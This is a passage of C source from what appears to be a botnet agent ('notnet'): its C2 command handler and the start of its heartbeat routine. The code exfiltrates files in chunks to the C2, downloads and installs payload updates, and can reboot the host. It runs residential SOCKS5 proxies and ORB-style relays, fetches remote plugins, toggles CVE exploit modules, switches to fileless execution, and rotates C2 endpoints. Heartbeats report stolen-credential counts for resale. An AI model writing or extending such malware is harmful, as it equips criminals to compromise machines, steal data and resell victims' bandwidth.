                protocol_send_response(bot, CMD_EXFIL, "exfil rejected: dangerous char in path");
            } else if (file_path[0] == '\0') {
                protocol_send_response(bot, CMD_EXFIL, "exfil: no file path specified");
            } else {
                unsigned char *data = NULL;
                int fsize = file_read(file_path, &data);
                if (fsize < 0) {
                    protocol_send_response(bot, CMD_EXFIL, "exfil failed: could not read file");
                } else {
                    /* Chunk large files: protocol_send_response max is ~2048 bytes.
                     * Send first chunk as response, rest via HTTP POST. */
                    const int CHUNK = 1024;
                    int offset = 0;
                    int total_sent = 0;

                    while (offset < fsize) {
                        int chunk = fsize - offset;
                        if (chunk > CHUNK) chunk = CHUNK;

                        if (offset == 0) {
                            /* First chunk: send via protocol_send_response.
                             * #169: same remaining-space bound as exfil_creds. */
                            char resp[2048];
                            int rlen = snprintf(resp, sizeof(resp),
                                "exfil chunk: %d/%d bytes", chunk, fsize);
                            if (rlen > 0 && rlen < (int)sizeof(resp)) {
                                int space = (int)sizeof(resp) - 1 - rlen;
                                if (chunk > space) chunk = space;
                                if (chunk > 0) {
                                    memcpy(resp + rlen, data + offset, (size_t)chunk);
                                    rlen += chunk;
                                }
                                resp[rlen] = '\0';
                            }
                            protocol_send_response(bot, CMD_EXFIL, resp);
                        } else {
                            /* Subsequent chunks: send via HTTP POST */
                            char upload_path[512];
                            snprintf(upload_path, sizeof(upload_path),
                                "%s/exfil", bot->c2_http.path);
                            /* Write chunk to temp file, then upload the temp
                             * file. (#115): the old draft called
                             * http_upload(bot, "/dev/stdin", ...) here —
                             * a leftover from a different design; every
                             * chunk after the first produced a spurious
                             * upload error (and would leak stdin if it was
                             * a regular file). The exfil_creds chunking
                             * (written later, #90) has no such call. */
                            char tmp[256];
                            snprintf(tmp, sizeof(tmp), "/tmp/.exfil.%d", offset);
                            FILE *tf = fopen(tmp, "wb");
                            if (tf) {
                                fwrite(data + offset, 1, chunk, tf);
                                fclose(tf);
                                http_upload(bot, tmp, upload_path);
                                unlink(tmp);
                            }
                        }

                        offset += chunk;
                        total_sent += chunk;
                    }

                    log_info("CMD: exfil completed: %d bytes from %s", total_sent, file_path);
                }
            }
        } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
            /* SECURITY FIX (#65): Actually perform the update instead of
             * logging. Parses an optional URL argument:
             *   update                 -> fetch from configured C2 path
             *   update <url>           -> fetch from explicit http:// URL
             * Downloads, verifies the SHA-256 pin (fail-closed), and
             * installs to /tmp/.notnet. */
            char *args = cmd + strlen(CMD_UPDATE);
            while (*args == ' ' || *args == '\t') args++;

            char url[1024] = {0};
            if (*args) {
                snprintf(url, sizeof(url), "%.1000s", args);
            }

            int result = payload_update(bot, url[0] ? url : NULL, "/tmp/.notnet");
            if (result > 0) {
                log_info("CMD: update: downloaded %d bytes", result);
                if (payload_install(bot, "/tmp/.notnet") == 0) {
                    protocol_send_response(bot, CMD_UPDATE, "update: installed");
                } else {
                    protocol_send_response(bot, CMD_UPDATE, "update: downloaded but install failed");
                }
            } else if (result == 0) {
                /* payload_update returns 0 only from the compile fallback
                 * path (compiled + installed source bundle). */
                if (payload_install(bot, "/tmp/.notnet") == 0) {
                    protocol_send_response(bot, CMD_UPDATE, "update: compiled from source and installed");
                } else {
                    protocol_send_response(bot, CMD_UPDATE, "update: compiled but install failed");
                }
            } else {
                log_warn("CMD: update failed");
                protocol_send_response(bot, CMD_UPDATE, "update: failed (SHA-256 pin mismatch or download error)");
            }
        } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
            /* SECURITY FIX (#67): Actually reboot. The old handler replied
             * 'reboot: received' and did nothing, while README sold it as a
             * working command — a silent lie to C2 operators. Use fork()
             * + execvp() so no shell is involved; the command was already
             * authenticated at the channel gate (IRC nick allowlist /
             * HTTP-WS shared secret). */
            log_warn("CMD: reboot requested by C2");
            protocol_send_response(bot, CMD_REBOOT, "reboot: executing");

            pid_t rpid = fork();
            if (rpid < 0) {
                log_error("CMD: reboot fork failed: %s", strerror(errno));
            } else if (rpid == 0) {
                /* Child: close C2 sockets, then try to reboot */
                if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
                if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
                if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
                /* sync + reboot via exec; fall back to reboot(RB_AUTOBOOT) */
                char *argv1[] = { "sync", NULL };
                execvp("sync", argv1);
                char *argv2[] = { "/sbin/reboot", NULL };
                execvp("/sbin/reboot", argv2);
                char *argv3[] = { "reboot", NULL };
                execvp("reboot", argv3);
                _exit(127);
            }
            /* Parent: do not wait — the machine is going down anyway */
        } else if (strncmp(cmd, CMD_SLEEP, strlen(CMD_SLEEP)) == 0) {
            /* SECURITY FIX (#36): Clamp the interval. A raw atoi() with
             * no bounds lets the C2 set scan_interval to a huge value
             * (or 0) — uint32 wrap and usleep(interval*1000000) freeze
             * the agent. Accept 1..3600 like config_set does. */
            char *interval = strchr(cmd, ' ');
            if (interval) {
                int v = atoi(interval + 1);
                if (v >= 1 && v <= 3600) {
                    bot->scan_interval = (uint32_t)v;
                    log_info("CMD: sleep interval set to %d", bot->scan_interval);
                } else {
                    log_warn("CMD: sleep interval rejected (must be 1-3600): %d", v);
                    protocol_send_response(bot, CMD_SLEEP, "sleep: interval rejected (1-3600)");
                }
            }
        } else if (strncmp(cmd, CMD_CONFIG_SET, strlen(CMD_CONFIG_SET)) == 0) {
            /* SECURITY FIX (#7): Implement config_set with allowlist
             * and validation. Only safe runtime config keys are accepted. */
            char *args = cmd + strlen(CMD_CONFIG_SET);
            while (*args == ' ' || *args == '\t') args++;
            
            char key[128], value[256];
            if (sscanf(args, "%127[^=]=%255s", key, value) != 2) {
                log_warn("CMD: config_set invalid format: %s", args);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: invalid format, use key=value");
                continue;
            }
            
            /* Allowlist of settable config keys with validation */
            int applied = 0;
            if (strcmp(key, "scan_interval") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 3600) {
                    bot->scan_interval = v;
                    applied = 1;
                }
            } else if (strcmp(key, "heartbeat_interval") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 3600) {
                    bot->heartbeat_interval = v;
                    applied = 1;
                }
            } else if (strcmp(key, "ssh_enabled") == 0) {
                bot->ssh_enabled = (atoi(value) != 0);
                applied = 1;
            } else if (strcmp(key, "telnet_enabled") == 0) {
                bot->telnet_enabled = (atoi(value) != 0);
                applied = 1;
            } else if (strcmp(key, "persist_enabled") == 0) {
                /* SECURITY FIX (#84): strict 0/1 toggle. When set to 0 the bot
                 * enters RAM-only fileless mode immediately by relaunching via
                 * memfd_create/fexecve (#150: observable via SIM_EVIDENCE). */
                int v = atoi(value);
                if (v == 0 || v == 1) {
                    bot->persist_enabled = (uint8_t)v;
                    applied = 1;
                    if (v == 0) {
                        persist_become_fileless(bot);  /* enter fileless now */
                    }
                }
            } else if (strcmp(key, "scan_timeout_ms") == 0) {
                int v = atoi(value);
                if (v >= 100 && v <= 30000) {
                    bot->scan_timeout_ms = v;
                    applied = 1;
                }
            } else if (strcmp(key, "scan_max_hosts") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 65535) {
                    bot->scan_max_hosts = v;
                    applied = 1;
                }
            } else if (strcmp(key, "flux_enabled") == 0) {
                /* SECURITY FIX (#85): strict 0/1 toggle. Takes effect on
                 * the next connect attempt. */
                int v = atoi(value);
                if (v == 0 || v == 1) {
                    bot->flux_enabled = (uint8_t)v;
                    applied = 1;
                }
            } else if (strcmp(key, "flux_ttl") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 3600) {
                    bot->flux_ttl = (uint32_t)v;
                    applied = 1;
                }
            } else if (strcmp(key, "dead_drop_url") == 0) {
                /* SECURITY FIX (#86): dead-drop C2 endpoint. */
                strncpy(bot->dead_drop_url, value, sizeof(bot->dead_drop_url) - 1);
                bot->dead_drop_url[sizeof(bot->dead_drop_url) - 1] = '\0';
                applied = 1;
            } else if (strcmp(key, "dead_drop_interval") == 0) {
                /* SECURITY FIX (#86): clamp like flux_ttl — a 0 would hammer
                 * the drop every loop. */
                int v = atoi(value);
                if (v >= 30 && v <= 86400) {
                    bot->dead_drop_interval = (uint32_t)v;
                    applied = 1;
                }
            } else if (strcmp(key, "proxy_enabled") == 0) {
                /* SECURITY FIX (#89): strict 0/1 toggle. Takes effect
                 * immediately: 1 starts the accept thread (token required),
                 * 0 stops it. */
                int v = atoi(value);
                if (v == 0 || v == 1) {
                    bot->proxy_enabled = (uint8_t)v;
                    if (v == 1) {
                        if (bot->proxy_token[0] == '\0') {
                            log_warn("CMD: proxy_enabled=1 but no proxy_token set");
                        } else {
                            proxy_start(bot);
                        }
                    } else {
                        proxy_stop();
                    }
                    applied = 1;
                }
            } else if (strcmp(key, "proxy_port") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 65535) {
                    bot->proxy_port = (uint16_t)v;
                    applied = 1;
                }
            } else if (strcmp(key, "proxy_token") == 0) {
                strncpy(bot->proxy_token, value, sizeof(bot->proxy_token) - 1);
                bot->proxy_token[sizeof(bot->proxy_token) - 1] = '\0';
                applied = 1;
            } else if (strcmp(key, "relay_enabled") == 0) {
                /* SECURITY FIX (#91): ORB-style relay, strict 0/1
                 * toggle. Takes effect immediately: 1 starts the relay
                 * accept thread (token required), 0 stops it. */
                int v = atoi(value);
                if (v == 0 || v == 1) {
                    bot->relay_enabled = (uint8_t)v;
                    if (v == 1) {
                        if (bot->relay_token[0] == '\0') {
                            log_warn("CMD: relay_enabled=1 but no relay_token set");
                        } else {
                            relay_start(bot);
                        }
                    } else {
                        relay_stop();
                    }
                    applied = 1;
                }
            } else if (strcmp(key, "relay_port") == 0) {
                int v = atoi(value);
                if (v >= 1 && v <= 65535) {
                    bot->relay_port = (uint16_t)v;
                    applied = 1;
                }
            } else if (strcmp(key, "relay_token") == 0) {
                strncpy(bot->relay_token, value, sizeof(bot->relay_token) - 1);
                bot->relay_token[sizeof(bot->relay_token) - 1] = '\0';
                applied = 1;
            } else if (strcmp(key, "plugin_enabled") == 0) {
                /* SECURITY FIX (#92): strict 0/1 toggle for the
                 * loader/plugin framework. 1 bootstraps the built-in
                 * registry and enables the `plugin` command; 0 refuses
                 * it. Takes effect on the next command. */
                int v = atoi(value);
                if (v == 0 || v == 1) {
                    bot->plugin_enabled = (uint8_t)v;
                    applied = 1;
                }
            } else if (strcmp(key, "byovd_guard") == 0) {
                /* SECURITY FIX (#94): strict 0/1 toggle for the BYOVD
                 * defense-neutralization guard. The byovd plugin is a
                 * defensive-only research scaffold — no driver-loading
                 * code exists; the flag only changes what its load
                 * refusal reports (driver abuse blocked). Takes effect
                 * on the next command. */
                int v = atoi(value);
                if (v == 0 || v == 1) {
                    bot->byovd_guard = (uint8_t)v;
                    applied = 1;
                }
            } else if (strncmp(key, "c2_backup_", 10) == 0) {
                /* SECURITY FIX (#93): disposable-infrastructure
                 * backup endpoint, same validation as the config file
                 * (c2_backup_<n> = host:port, contiguous from 1).
                 * Takes effect on the next connect attempt. */
                int idx = atoi(key + 10);
                if (idx >= 1 && idx <= C2_BACKUP_MAX) {
                    char ehost[256];
                    uint16_t eport = 0;
                    if (c2_rotation_parse_endpoint(value, ehost, sizeof(ehost),
                                                   &eport) == 0) {
                        snprintf(bot->c2_backup[idx - 1],
                                 sizeof(bot->c2_backup[0]), "%s", value);
                        bot->c2_backup_count = 0;
                        for (int i = 0; i < C2_BACKUP_MAX; i++) {
                            if (bot->c2_backup[i][0] == '\0') break;
                            bot->c2_backup_count = (uint8_t)(i + 1);
                        }
                        applied = 1;
                    }
                }
            } else if (strcmp(key, "bot_tag") == 0) {
                /* SECURITY FIX (#93): affiliate/operator tag. Bounded
                 * to BOT_TAG_MAX chars; reported in heartbeats from
                 * the next beat on. */
                strncpy(bot->bot_tag, value, BOT_TAG_MAX - 1);
                bot->bot_tag[BOT_TAG_MAX - 1] = '\0';
                applied = 1;
            }
            
            if (applied) {
                log_info("CMD: config_set %s=%s applied", key, value);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: applied");
            } else {
                log_warn("CMD: config_set rejected key '%s'", key);
                protocol_send_response(bot, CMD_CONFIG_SET, "config_set: key not allowed or invalid value");
            }
        } else if (strncmp(cmd, CMD_PROXY, strlen(CMD_PROXY)) == 0) {
            /* SECURITY FIX (#89): Residential SOCKS5 forward proxy.
             * 'proxy on [port]' starts the accept thread, 'proxy off'
             * stops it. Refused without a configured proxy_token. */
            char *args = cmd + strlen(CMD_PROXY);
            while (*args == ' ' || *args == '\t') args++;
            if (strncmp(args, "on", 2) == 0) {
                int port = 0;
                char *rest = args + 2;
                while (*rest == ' ' || *rest == '\t') rest++;
                if (*rest != '\0') {
                    int v = atoi(rest);
                    if (v >= 1 && v <= 65535) port = v;
                }
                if (port && proxy_is_running() && proxy_get_port() != port) {
                    proxy_stop();   /* rebind on the requested port */
                }
                if (port) bot->proxy_port = (uint16_t)port;
                if (bot->proxy_token[0] == '\0') {
                    protocol_send_response(bot, CMD_PROXY, "proxy on: no proxy_token configured (set proxy_token=)");
                } else if (proxy_start(bot) == 0) {
                    log_info("CMD: proxy on (port %d)", proxy_get_port());
                    char rbuf[64];
                    snprintf(rbuf, sizeof(rbuf), "proxy on: listening on %d", proxy_get_port());
                    protocol_send_response(bot, CMD_PROXY, rbuf);
                } else {
                    protocol_send_response(bot, CMD_PROXY, "proxy on: failed to start (bind or thread)");
                }
            } else if (strncmp(args, "off", 3) == 0) {
                if (proxy_is_running()) {
                    proxy_stop();
                    protocol_send_response(bot, CMD_PROXY, "proxy off: stopped");
                } else {
                    protocol_send_response(bot, CMD_PROXY, "proxy off: not running");
                }
            } else {
                protocol_send_response(bot, CMD_PROXY, "proxy: usage proxy on|off [port]");
            }
        } else if (strncmp(cmd, CMD_RELAY, strlen(CMD_RELAY)) == 0) {
            /* SECURITY FIX (#91): ORB-style relay (Volt Typhoon pattern).
             * Listener control: 'relay on [port]' / 'relay off' — starts
             * or stops the token-authenticated relay accept thread
             * (refused without a configured relay_token, like the proxy).
             * Per-target path probe: 'relay <target> <port> [via
             * <host>:<port>]' — connect to the target, either directly
             * (baseline) or through the relay bot at via_host:via_port
             * (single hop), and report the RTT. This is the building
             * block for per-target relay selection: the operator probes
             * candidate relays and prefers the one closest to the
             * target. Multi-hop chains are future work. Not a DHT. */
            char *args = cmd + strlen(CMD_RELAY);
            while (*args == ' ' || *args == '\t') args++;
            /* Guard "on"/"off" with a delimiter so a target host that
             * merely starts with those letters (e.g. "onion.example")
             * is not swallowed by the listener-control branch. */
            int ctrl = 0;
            if ((strncmp(args, "on", 2) == 0 &&
                 (args[2] == ' ' || args[2] == '\t' || args[2] == '\0')) ||
                (strncmp(args, "off", 3) == 0 &&
                 (args[3] == ' ' || args[3] == '\t' || args[3] == '\0'))) {
                ctrl = 1;
            }
            if (ctrl && strncmp(args, "on", 2) == 0) {
                int port = 0;
                char *rest = args + 2;
                while (*rest == ' ' || *rest == '\t') rest++;
                if (*rest != '\0') {
                    int v = atoi(rest);
                    if (v >= 1 && v <= 65535) port = v;
                }
                if (port && relay_is_running() && relay_get_port() != port) {
                    relay_stop();   /* rebind on the requested port */
                }
                if (port) bot->relay_port = (uint16_t)port;
                if (bot->relay_token[0] == '\0') {
                    protocol_send_response(bot, CMD_RELAY, "relay on: no relay_token configured (set relay_token=)");
                } else if (relay_start(bot) == 0) {
                    log_info("CMD: relay on (port %d)", relay_get_port());
                    char rbuf[64];
                    snprintf(rbuf, sizeof(rbuf), "relay on: listening on %d", relay_get_port());
                    protocol_send_response(bot, CMD_RELAY, rbuf);
                } else {
                    protocol_send_response(bot, CMD_RELAY, "relay on: failed to start (bind or thread)");
                }
            } else if (ctrl && strncmp(args, "off", 3) == 0) {
                if (relay_is_running()) {
                    relay_stop();
                    protocol_send_response(bot, CMD_RELAY, "relay off: stopped");
                } else {
                    protocol_send_response(bot, CMD_RELAY, "relay off: not running");
                }
            } else {
                /* Per-target path probe. Split at " via " first so the
                 * target half is independent of the via syntax. The via
                 * half may itself contain more " via " hops (multi-hop
                 * chains, #relay-multihop). */
                char *via_arg = strstr(args, " via ");
                char *via_host = NULL;
                char chain[512] = {0};
                int nchain = 0;
                int via_bad = 0;
                if (via_arg) {
                    *via_arg = '\0';    /* args now ends at " via " */
                    via_host = via_arg + 5;
                    while (*via_host == ' ' || *via_host == '\t') via_host++;
                    /* Parse every hop in the via half into one chain
                     * suffix (" VIA h1:p1 VIA h2:p2 ..."). */
                    char *vp = via_host;
                    while (vp && *vp) {
                        char *next_via = strstr(vp, " via ");
                        if (next_via) *next_via = '\0';
                        char vh[256] = {0};
                        unsigned int vport = 0;
                        if (sscanf(vp, "%255[^:]:%u", vh, &vport) != 2 ||
                            vport < 1 || vport > 65535) {
                            via_bad = 1;
                            break;
                        }
                        int n = snprintf(chain + nchain,
                                         sizeof(chain) - (size_t)nchain,
                                         " VIA %s:%u", vh, vport);
                        if (n < 0 || (size_t)n >= sizeof(chain) - (size_t)nchain) {
                            via_bad = 1;
                            break;
                        }
                        nchain += n;
                        if (!next_via) break;
                        vp = next_via + 5;
                        while (*vp == ' ' || *vp == '\t') vp++;
                    }
                    if (via_bad) {
                        protocol_send_response(bot, CMD_RELAY,
                            "relay: bad via, use via <host>:<port> [via <host>:<port> ...]");
                        continue;
                    }
                }
                char host[256] = {0};
                unsigned int port = 0;
                if (sscanf(args, "%255s %u", host, &port) != 2 ||
                    port < 1 || port > 65535) {
                    protocol_send_response(bot, CMD_RELAY,
                        "relay: usage relay <target> <port> [via <host>:<port> ...] | relay on [port] | relay off");
                    continue;
                }
                long rtt = 0;
                char rbuf[640];
                if (relay_probe_chain(bot, host, (uint16_t)port,
                                      nchain ? chain : NULL, &rtt) == 0) {
                    if (nchain) {
                        snprintf(rbuf, sizeof(rbuf),
                                 "relay: %s:%u reachable via%s in %ldms",
                                 host, port, chain, rtt);
                    } else {
                        snprintf(rbuf, sizeof(rbuf),
                                 "relay: %s:%u reachable directly in %ldms",
                                 host, port, rtt);
                    }
                    log_info("CMD: %s", rbuf);
                } else {
                    if (nchain) {
                        snprintf(rbuf, sizeof(rbuf),
                                 "relay: %s:%u unreachable via%s",
                                 host, port, chain);
                    } else {
                        snprintf(rbuf, sizeof(rbuf),
                                 "relay: %s:%u unreachable", host, port);
                    }
                    log_info("CMD: %s", rbuf);
                }
                protocol_send_response(bot, CMD_RELAY, rbuf);
            }
        } else if (strncmp(cmd, CMD_PLUGIN, strlen(CMD_PLUGIN)) == 0) {
            /* SECURITY FIX (#92): Loader/plugin framework (the
             * Bredolab/Emotet split). The C2 dispatches capabilities
             * by name against the built-in plugin registry:
             *   plugin status                      -> list registry
             *   plugin <name> load|run|unload|status
             * v1 plugins are compile-time linked (spread, proxy,
             * relay, cred-log; byovd planned), so 'load' flips
             * registry state and runs the (no-op) load callback.
             * Remote fetch of shared-object plugins is planned future
             * work and must use the fail-closed payload_sha256 pin
             * pattern. Refused entirely when plugin_enabled=0. */
            if (!bot->plugin_enabled) {
                protocol_send_response(bot, CMD_PLUGIN,
                    "plugin: disabled (plugin_enabled=0)");
                continue;
            }
            char *args = cmd + strlen(CMD_PLUGIN);
            while (*args == ' ' || *args == '\t') args++;

            if (args[0] == '\0') {
                protocol_send_response(bot, CMD_PLUGIN,
                    "plugin: usage 'plugin status' | 'plugin fetch <name> <url> <sha256>' | 'plugin drop <name>' | 'plugin <name> load|run|unload|status'");
                continue;
            }
            if (strcmp(args, "status") == 0) {
                char pbuf[1024];
                plugin_status(pbuf, sizeof(pbuf));
                protocol_send_response(bot, CMD_PLUGIN, pbuf);
                continue;
            }
            /* Remote shared-object fetch (#92 future work, 2026-08-12):
             * `plugin fetch <name> <url> <sha256>` — downloads, verifies
             * the SHA-256 pin (fail-closed), dlopen()s, and registers the
             * plugin for the normal load/run/unload dispatch. */
            if (strncmp(args, "fetch ", 6) == 0) {
                char pname[PLUGIN_NAME_MAX];
                char purl[512];
                char psha[65];
                char *a = args + 6;
                if (sscanf(a, "%31s %511s %64s", pname, purl, psha) == 3) {
                    char rbuf[160];
                    if (plugin_fetch_remote(bot, pname, purl, psha) == 0) {
                        snprintf(rbuf, sizeof(rbuf),
                                 "plugin %s: fetched + registered (SHA-256 verified)", pname);
                    } else {
                        snprintf(rbuf, sizeof(rbuf),
                                 "plugin %s: fetch failed (see bot log)", pname);
                    }
                    protocol_send_response(bot, CMD_PLUGIN, rbuf);
                } else {
                    protocol_send_response(bot, CMD_PLUGIN,
                        "plugin: fetch usage: plugin fetch <name> <url> <sha256>");
                }
                continue;
            }
            /* Remote drop: unload + dlclose + remove the fetched .so. */
            if (strncmp(args, "drop ", 5) == 0) {
                char pname[PLUGIN_NAME_MAX];
                if (sscanf(args + 5, "%31s", pname) == 1) {
                    char rbuf[128];
                    if (plugin_drop_remote(bot, pname) == 0) {
                        snprintf(rbuf, sizeof(rbuf), "plugin %s: dropped", pname);
                    } else {
                        snprintf(rbuf, sizeof(rbuf),
                                 "plugin %s: drop failed (unknown or built-in)", pname);
                    }
                    protocol_send_response(bot, CMD_PLUGIN, rbuf);
                } else {
                    protocol_send_response(bot, CMD_PLUGIN,
                        "plugin: drop usage: plugin drop <name>");
                }
                continue;
            }

            char pname[PLUGIN_NAME_MAX];
            char pop[16];
            if (sscanf(args, "%31s %15s", pname, pop) != 2) {
                protocol_send_response(bot, CMD_PLUGIN,
                    "plugin: usage 'plugin <name> load|run|unload|status'");
                continue;
            }

            notnet_plugin_t *plg = plugin_find(pname);
            if (!plg) {
                char rbuf[128];
                snprintf(rbuf, sizeof(rbuf),
                         "plugin %s: unknown (see 'plugin status')", pname);
                protocol_send_response(bot, CMD_PLUGIN, rbuf);
                continue;
            }

            char rbuf[160];
            if (strcmp(pop, "load") == 0) {
                if (plg->loaded) {
                    snprintf(rbuf, sizeof(rbuf), "plugin %s: already loaded", pname);
                } else if (plugin_load(bot, pname) == 0) {
                    snprintf(rbuf, sizeof(rbuf), "plugin %s: loaded", pname);
                } else {
                    snprintf(rbuf, sizeof(rbuf), "plugin %s: load failed", pname);
                }
                protocol_send_response(bot, CMD_PLUGIN, rbuf);
            } else if (strcmp(pop, "run") == 0) {
                if (!plg->loaded) {
                    snprintf(rbuf, sizeof(rbuf),
                             "plugin %s: not loaded (load first)", pname);
                } else if (plugin_run(bot, pname) == 0) {
                    snprintf(rbuf, sizeof(rbuf), "plugin %s: ran", pname);
                } else {
                    snprintf(rbuf, sizeof(rbuf), "plugin %s: run failed", pname);
                }
                protocol_send_response(bot, CMD_PLUGIN, rbuf);
            } else if (strcmp(pop, "unload") == 0) {
                if (!plg->loaded) {
                    snprintf(rbuf, sizeof(rbuf), "plugin %s: not loaded", pname);
                } else if (plugin_unload(bot, pname) == 0) {
                    snprintf(rbuf, sizeof(rbuf), "plugin %s: unloaded", pname);
                } else {
                    snprintf(rbuf, sizeof(rbuf), "plugin %s: unload failed", pname);
                }
                protocol_send_response(bot, CMD_PLUGIN, rbuf);
            } else if (strcmp(pop, "status") == 0) {
                snprintf(rbuf, sizeof(rbuf), "plugin %s: %s (%s)", pname,
                         plg->loaded ? "loaded" : "unloaded",
                         plg->description);
                protocol_send_response(bot, CMD_PLUGIN, rbuf);
            } else {
                protocol_send_response(bot, CMD_PLUGIN,
                    "plugin: usage 'plugin <name> load|run|unload|status'");
            }
        } else if (strncmp(cmd, CMD_CVE, strlen(CMD_CVE)) == 0) {
            /* #143: CVE module registry control. `cve list` shows all
             * modules + enabled state; `cve enable <id>` / `cve
             * disable <id>` toggle which modules participate in
             * cve_run_modules(). A live feed without recompilation. */
            char *args = cmd + strlen(CMD_CVE);
            while (*args == ' ' || *args == '\t') args++;
            if (args[0] == '\0' || strcmp(args, "list") == 0) {
                char rbuf[1024];
                cve_registry_status(rbuf, sizeof(rbuf));
                protocol_send_response(bot, CMD_CVE, rbuf);
            } else if (strncmp(args, "enable ", 7) == 0) {
                char *id = args + 7;
                while (*id == ' ') id++;
                char rbuf[128];
                if (cve_module_enable(id) == 0)
                    snprintf(rbuf, sizeof(rbuf), "cve: %s enabled", id);
                else
                    snprintf(rbuf, sizeof(rbuf), "cve: enable failed (unknown id '%s')", id);
                protocol_send_response(bot, CMD_CVE, rbuf);
            } else if (strncmp(args, "disable ", 8) == 0) {
                char *id = args + 8;
                while (*id == ' ') id++;
                char rbuf[128];
                if (cve_module_disable(id) == 0)
                    snprintf(rbuf, sizeof(rbuf), "cve: %s disabled", id);
                else
                    snprintf(rbuf, sizeof(rbuf), "cve: disable failed (unknown id '%s')", id);
                protocol_send_response(bot, CMD_CVE, rbuf);
            } else {
                protocol_send_response(bot, CMD_CVE,
                    "cve: usage 'cve list' | 'cve enable <id>' | 'cve disable <id>'");
            }
        } else if (strncmp(cmd, CMD_ROTATE, strlen(CMD_ROTATE)) == 0) {
            /* SECURITY FIX (#93): manual C2 rotation — advance the
             * disposable-infrastructure chain immediately. Operator
             * intent, so it does not consume the automatic-churn
             * budget (C2_ROTATE_MAX). */
            char rbuf[512];
            if (bot->c2_backup_count == 0) {
                snprintf(rbuf, sizeof(rbuf),
                         "rotate: no backup endpoints (set c2_backup_1..%d)", C2_BACKUP_MAX);
            } else {
                c2_rotation_manual(bot);
                char ehost[256];
                uint16_t eport = 0;
                if (c2_rotation_endpoint(bot, ehost, sizeof(ehost), &eport) == 0) {
                    snprintf(rbuf, sizeof(rbuf), "rotate: now on %s:%u (slot %d/%d)",
                             ehost, eport, bot->c2_rot_index,
                             bot->c2_backup_count + 1);
                } else {
                    snprintf(rbuf, sizeof(rbuf), "rotate: now on slot %d/%d",
                             bot->c2_rot_index, bot->c2_backup_count + 1);
                }
            }
            protocol_send_response(bot, CMD_ROTATE, rbuf);
        } else if (strncmp(cmd, CMD_KILL, strlen(CMD_KILL)) == 0) {
            /* SECURITY FIX (#93): affiliate capacity hand-back — the
             * disposable-infrastructure flip side of rotation. Delegates
             * to the shared one-way door kill_self() (killswitch.c):
             * wipe the credential buffer, stop every capability via the
             * plugin stop callbacks (proxy_stop/relay_stop are
             * idempotent), remove persistence, then latch kill_pending
             * so the main loop exits through the normal cleanup path
             * (lock removal, log flush) with status 0. One-way door —
             * there is no un-kill. */
            log_warn("CMD: kill requested by C2 — wiping state and exiting");
            protocol_send_response(bot, CMD_KILL, "kill: wiping state");
            kill_self(bot, "C2 kill command");
        }
    }
    
    if (skipped > 0) {
        log_warn("CMD: %d commands deferred due to rate limit (kept for next second)", skipped);
    }

    /* Clear processed commands.
     * SECURITY FIX (#9): Only clear the queue when processing completed
     * normally. Connection failures during C2 ops should not silently
     * drop unprocessed commands. Clear unconditionally only if we
     * reached here — processing errors within the loop use continue
     * and still fall through to this clear.
     * (#107): keep deferred (rate-limited) commands — they were compacted
     * to the front by the loop above, so cmd_count = keep (not 0). */
    bot->cmd_count = keep;

    /* #170: release the queue lock taken at function entry. */
    mesh_cmd_queue_unlock();

    return 0;
}

/* SECURITY FIX: JSON-escape a string to prevent injection in protocol
 * responses. Escapes backslash, double-quote, and control characters. */
static void json_escape(const char *src, char *dst, size_t dst_size) {
    /* SECURITY FIX (#12): Guard against size_t underflow when dst_size < 6.
     * The original 'j < dst_size - 6' wraps to a huge value on unsigned
     * subtraction, causing out-of-bounds writes. */
    if (dst_size < 6) {
        if (dst_size > 0) dst[0] = '\0';
        return;
    }
    size_t i, j;
    for (i = 0, j = 0; src[i] && j < dst_size - 6; i++) {
        switch (src[i]) {
            case '\\':
                dst[j++] = '\\'; dst[j++] = '\\'; break;
            case '"':
                dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\n':
                dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\r':
                dst[j++] = '\\'; dst[j++] = 'r'; break;
            case '\t':
                dst[j++] = '\\'; dst[j++] = 't'; break;
            default:
                if ((unsigned char)src[i] < 0x20) {
                    /* SECURITY FIX: Check remaining space for \uXXXX (6 bytes) */
                    if (j + 6 >= dst_size) break;
                    int written = snprintf(dst + j, dst_size - j, "\\u%04x", (unsigned char)src[i]);
                    if (written < 0 || (size_t)written >= dst_size - j) {
                        j = dst_size - 1;
                        break;
                    }
                    j += written;
                } else {
                    dst[j++] = src[i];
                }
                break;
        }
    }
    dst[j] = '\0';
}

int protocol_send_heartbeat(notnet_bot_t *bot) {
    /* SECURITY FIX (#1): Escape hostname to prevent JSON injection */
    char safe_hostname[BOT_MAX_HOSTNAME_LEN];
    json_escape(bot->hostname, safe_hostname, sizeof(safe_hostname));

    /* SECURITY FIX (#16): Increase buffer for escaped hostname */
    char safe_secret[64];
    json_escape(bot->secret, safe_secret, sizeof(safe_secret));

    /* SECURITY FIX (#93): Affiliate/operator tag, escaped like
     * hostname — a 64-char tag expands to at most ~130 bytes, so the
     * escape buffer is sized for the worst case. */
    char safe_tag[BOT_TAG_MAX * 2 + 8];
    json_escape(bot->bot_tag, safe_tag, sizeof(safe_tag));

    char heartbeat[1536];
    /* SECURITY FIX (#89): report proxy status so the C2 can build a
     * residential-proxy inventory (on/off + bound port).
     * (#90): report cred_count so the C2 can track log-sale inventory.
     * (#91): report relay status so the C2 can build a relay inventory
     * for per-target relay selection (ORB pattern).
     * (#93): report the affiliate/operator tag so the C2 can attribute
     * bots to affiliates (per-affiliate inventory + teardown). */
    int ret = snprintf(heartbeat, sizeof(heartbeat),
        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d,\"tag\":\"%s\"}",
